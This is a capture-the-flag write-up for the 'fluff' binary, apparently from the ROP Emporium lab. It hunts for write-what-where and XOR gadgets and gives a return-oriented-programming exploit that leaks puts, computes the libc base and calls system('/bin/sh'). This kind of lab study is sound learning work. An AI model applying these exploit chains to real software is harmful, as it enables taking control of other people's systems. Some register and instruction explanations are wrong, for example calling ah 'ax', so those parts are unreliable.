# fluff

First, we check the offset is still the same sending 41 "A" characters:

![a](images/Screenshot_1.jpg)

---------------------------------

## 3.1. Searching Write-What-Where Gadgets

```
python /root/tools/ROPgadget/ROPgadget.py --binary fluff | grep mov | grep "\["
```

We find one:

- 0x000000000040084f : mov dword ptr [rdx], ebx ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret

But we can not control RDX nor RBX with "pop; pop; ret" gadgets (or any other type, at least easily).

However, we find 2 XOR gadgets that could be useful:

- 0x0000000000400855 : xor byte ptr [r10], r12b ; ret

- 0x0000000000400856 : xor byte ptr [rdx], ah ; ret


Checking the [Windows x64 architecture page](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/x64-architecture) we find the register *r12b* is the lower 8 bits of R12 and *ah* (also known as *ax*) the 16 lower bytes of EAX.

We open the [XOR online webiste](http://xor.pw/#) and check that when we xor any value with 0, it returns the same value (A xor 0 = A). So if we find a memory address full of 0x00, we can write something there with these gadgets.

We could try to do this then:

```
xor byte ptr [rdx], ah

xor byte ptr [writable_memory], "/bin"

xor byte ptr [writable_memory+4], "//sh"
```

However we can not control RDX nor RAX with "pop; pop; ret" gadgets (or any other type, at least easily).

Ok let us start then checking what registers we CAN control:

- R12: 0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
- R13: 0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret
- R14: 0x00000000004008c0 : pop r14 ; pop r15 ; ret
- R15: 0x00000000004008c2 : pop r15 ; ret
- RBP: 0x00000000004006b0 : pop rbp ; ret
- RSI: 0x00000000004008c1 : pop rsi ; pop r15 ; ret
- RDI: 0x00000000004008c3 : pop rdi ; ret
- RSP: 0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret /// pop rsp ; mov r13d, 0x604060 ; ret

We can make EBX = 0 with:

- 0x0000000000400823 : xor ebx, ebx ; pop r14 ; mov edi, 0x601050 ; ret

By now we don't care about the mov instruction which changes EDI or the "pop r14"

And do EBX = EBX + ESI with:

- 0x0000000000400719 : add ebx, esi ; ret

Because we can control RSI with a "pop; ret" gadget. 
So we can control EBX! And EBX was part of the write-what-where primitive we found (*mov dword ptr [rdx], ebx*)

Now, we need to control RDX to use the write-what-where gadget or R10 to use the XOR gadget.


Interesting???

- 0x0000000000400715 : outsb dx, byte ptr [rsi] ; or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret

- 0x0000000000400716 : or dword ptr [rax], esp ; add byte ptr [rcx], al ; ret

-0x0000000000400824 : fild dword ptr [rcx + 0x5e] ; mov edi, 0x601050 ; ret

- 0x00000000004008ac : fmul qword ptr [rax - 0x7d] ; ret



We will find the start address of .data with:

```
objdump -x fluff
```

So we will take **writable_memory = 0x601050**.

--------

There is a new instruction in the binary: adc. *The ADC (Add with Carry) instruction adds the values in Rn and Operand2 , together with the carry flag. You can use ADC to synthesize multiword arithmetic. In certain circumstances, the assembler can substitute one instruction for another. Be aware of this when reading disassembly listings.*


- ASCII to HEX - https://www.rapidtables.com/convert/number/ascii-to-hex.html



















































## 3.2. Libc leakage approach

The first approach is leaking an address of libc to calculate libc base address and then make a system("/bin/sh") call

### Rop 1: Leaking puts address

```
OFFSET = "A"*40
PUTS_PLT = elf.plt['puts']
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
puts_GOT = elf.got["puts"]

rop1 = OFFSET + p64(POP_RDI) + p64(puts_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```

### Calculating libc base address

```
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
libc.address = leak - libc.symbols["puts"]
```

### Rop 2: system("/bin/sh")

```
BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
```

